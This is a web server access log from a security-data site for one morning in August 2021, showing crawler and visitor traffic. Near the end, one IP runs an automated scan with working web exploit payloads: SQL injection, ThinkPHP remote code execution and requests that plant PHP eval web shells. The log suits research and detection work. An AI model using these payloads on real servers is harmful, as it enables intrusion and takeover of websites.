116.88.56.36 - - [12/Aug/2021:02:25:34 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:25:35 -0700] "GET / HTTP/1.1" 200 12881 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:25:35 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:25:36 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:25:36 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:25:36 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
114.119.154.135 - - [12/Aug/2021:02:27:00 -0700] "GET /self.logs/access.log.2020-08-19.gz HTTP/1.1" 200 25086 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.210.196.129 - - [12/Aug/2021:02:27:47 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [12/Aug/2021:02:27:50 -0700] "GET / HTTP/1.1" 200 12837 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
116.88.56.36 - - [12/Aug/2021:02:27:50 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6607379 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
17.121.113.7 - - [12/Aug/2021:02:28:39 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.7 - - [12/Aug/2021:02:28:39 -0700] "GET /self.logs/error.log.2019-12-22 HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
49.7.21.94 - - [12/Aug/2021:02:34:03 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.178 - - [12/Aug/2021:02:36:48 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.177 - - [12/Aug/2021:02:37:08 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.124 - - [12/Aug/2021:02:40:31 -0700] "GET /self.logs/access.log.2018-02-08.gz HTTP/1.1" 200 21869 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
45.155.205.249 - - [12/Aug/2021:02:40:59 -0700] "GET /.git/HEAD HTTP/1.1" 301 456 "-" "Python-urllib/3.9" 
45.155.205.249 - - [12/Aug/2021:02:40:59 -0700] "GET /.git/HEAD HTTP/1.1" 404 291 "-" "Python-urllib/3.9" 
116.88.56.36 - - [12/Aug/2021:02:43:56 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1543 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:43:57 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/Network/dns.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
197.54.179.145 - - [12/Aug/2021:02:45:22 -0700] "GET / HTTP/1.1" 200 12881 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
197.54.179.145 - - [12/Aug/2021:02:45:22 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
197.54.179.145 - - [12/Aug/2021:02:45:22 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
197.54.179.145 - - [12/Aug/2021:02:45:22 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
197.54.179.145 - - [12/Aug/2021:02:45:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:02:47:20 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1470 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
49.7.20.108 - - [12/Aug/2021:02:49:15 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
120.238.71.94 - - [12/Aug/2021:02:50:39 -0700] "GET / HTTP/1.1" 200 12881 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
120.238.71.94 - - [12/Aug/2021:02:50:39 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
120.238.71.94 - - [12/Aug/2021:02:50:39 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
120.238.71.94 - - [12/Aug/2021:02:50:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
120.238.71.94 - - [12/Aug/2021:02:50:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
114.119.154.155 - - [12/Aug/2021:03:00:43 -0700] "GET /self.logs/access.log.2020-04-12.gz HTTP/1.1" 200 14857 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.79.115 - - [12/Aug/2021:03:02:00 -0700] "GET /ads.txt HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.59 - - [12/Aug/2021:03:02:01 -0700] "GET /ads.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
116.88.56.36 - - [12/Aug/2021:03:06:57 -0700] "GET /self.logs/ HTTP/1.1" 200 31073 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:07:03 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17678 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:07:27 -0700] "GET / HTTP/1.1" 206 12893 "-" "WhatsApp/2.2130.9 N" 
114.119.154.14 - - [12/Aug/2021:03:07:32 -0700] "GET /self.logs/error.log.2019-03-09.gz HTTP/1.1" 200 4709 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
119.56.96.138 - - [12/Aug/2021:03:07:49 -0700] "GET / HTTP/1.1" 200 12881 "-" "Mozilla/5.0 (Linux; Android 11; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36" 
119.56.96.138 - - [12/Aug/2021:03:07:49 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36" 
119.56.96.138 - - [12/Aug/2021:03:07:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36" 
119.56.96.138 - - [12/Aug/2021:03:08:15 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:08:26 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 4368320 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:09:54 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 547221542 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
3.238.234.150 - - [12/Aug/2021:03:13:02 -0700] "GET / HTTP/1.1" 301 475 "-" "python-requests/2.18.1" 
3.238.234.150 - - [12/Aug/2021:03:13:02 -0700] "GET / HTTP/1.1" 200 12881 "-" "python-requests/2.18.1" 
3.238.234.150 - - [12/Aug/2021:03:13:02 -0700] "GET / HTTP/1.1" 200 12881 "-" "python-requests/2.18.1" 
3.238.234.150 - - [12/Aug/2021:03:13:02 -0700] "GET / HTTP/1.1" 200 12881 "-" "python-requests/2.18.1" 
106.38.241.177 - - [12/Aug/2021:03:14:01 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.113 - - [12/Aug/2021:03:14:15 -0700] "GET /self.logs/access.log.2018-11-20.gz HTTP/1.1" 200 20609 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.178 - - [12/Aug/2021:03:16:25 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.105 - - [12/Aug/2021:03:19:56 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
116.88.56.36 - - [12/Aug/2021:03:20:31 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:20:31 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
116.88.56.36 - - [12/Aug/2021:03:24:08 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
114.119.154.161 - - [12/Aug/2021:03:34:07 -0700] "GET /self.logs/access.log.2018-03-02.gz HTTP/1.1" 200 16450 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.124 - - [12/Aug/2021:03:40:57 -0700] "GET /self.logs/error.log.2017-02-02.gz HTTP/1.1" 200 957 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
112.5.37.18 - - [12/Aug/2021:03:46:51 -0700] "GET /data/admin/allowurl.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
49.7.20.108 - - [12/Aug/2021:03:46:52 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.155 - - [12/Aug/2021:03:47:39 -0700] "GET /self.logs/access.log.2018-09-08.gz HTTP/1.1" 200 48791 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.94 - - [12/Aug/2021:03:50:23 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.177 - - [12/Aug/2021:03:51:13 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.14 - - [12/Aug/2021:03:54:31 -0700] "GET /self.logs/access.log.2018-10-17.gz HTTP/1.1" 200 26574 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.178 - - [12/Aug/2021:03:54:43 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.210.86.142 - - [12/Aug/2021:03:59:28 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
95.163.255.54 - - [12/Aug/2021:04:00:54 -0700] "GET /robots.txt HTTP/1.0" 200 340 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.57 - - [12/Aug/2021:04:00:55 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/weird.html HTTP/1.1" 200 1898 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
114.119.154.124 - - [12/Aug/2021:04:01:25 -0700] "GET /self.logs/access.log.2020-06-22.gz HTTP/1.1" 200 12908 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
60.29.31.194 - - [12/Aug/2021:04:07:48 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0" 
114.119.154.155 - - [12/Aug/2021:04:08:14 -0700] "GET /self.logs/error.log.2018-10-12.gz HTTP/1.1" 200 4217 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.115 - - [12/Aug/2021:04:14:58 -0700] "GET /self.logs/error.log.2020-04-02.gz HTTP/1.1" 200 1140 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.135 - - [12/Aug/2021:04:21:50 -0700] "GET /self.logs/access.log.2017-08-11.gz HTTP/1.1" 200 18468 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.177 - - [12/Aug/2021:04:28:01 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.113 - - [12/Aug/2021:04:28:33 -0700] "GET /self.logs/error.log.2018-09-30.gz HTTP/1.1" 200 4545 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.149 - - [12/Aug/2021:04:32:00 -0700] "GET /ads.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
106.38.241.178 - - [12/Aug/2021:04:32:19 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
45.15.11.214 - - [12/Aug/2021:04:33:54 -0700] "POST //index.php/api/Uploadify/preview HTTP/1.1" 404 328 "http://www.secrepo.com//index.php/api/Uploadify/preview" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:54 -0700] "GET //user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:54 -0700] "GET //user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:55 -0700] "GET //d.php HTTP/1.1" 404 305 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:55 -0700] "GET //plus/moon.php HTTP/1.1" 404 305 "http://www.secrepo.com//plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:56 -0700] "GET //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 305 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:56 -0700] "GET //type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 418 746 "http://www.secrepo.com//type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:56 -0700] "GET //data/cache_template/rss.tpl.php HTTP/1.1" 404 305 "http://www.secrepo.com//data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:57 -0700] "GET //?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 418 746 "http://www.secrepo.com//?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:58 -0700] "GET //robots1.php HTTP/1.1" 404 305 "http://www.secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:58 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 418 746 "http://www.secrepo.com//?" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:58 -0700] "GET //12345.php HTTP/1.1" 404 305 "http://www.secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:59 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:59 -0700] "GET //robots.php HTTP/1.1" 404 305 "http://www.secrepo.com//robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:33:59 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 418 746 "http://www.secrepo.com//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:00 -0700] "GET //x.php HTTP/1.1" 404 305 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:00 -0700] "GET //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 404 305 "http://www.secrepo.com//index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:00 -0700] "GET //uploadfile/member/0/0x0.php HTTP/1.1" 404 305 "http://www.secrepo.com//uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:01 -0700] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com//index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
45.15.11.214 - - [12/Aug/2021:04:34:01 -0700] "GET //index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'),%20base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs')); HTTP/1.1" 418 746 "http://www.secrepo.com//index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'), base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs'));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:01 -0700] "GET //x.php HTTP/1.1" 404 305 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:02 -0700] "GET //SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 305 "http://www.secrepo.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:02 -0700] "GET //SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 404 305 "http://www.secrepo.com//SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:02 -0700] "POST //index.php?s=index HTTP/1.1" 404 305 "http://www.secrepo.com//index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
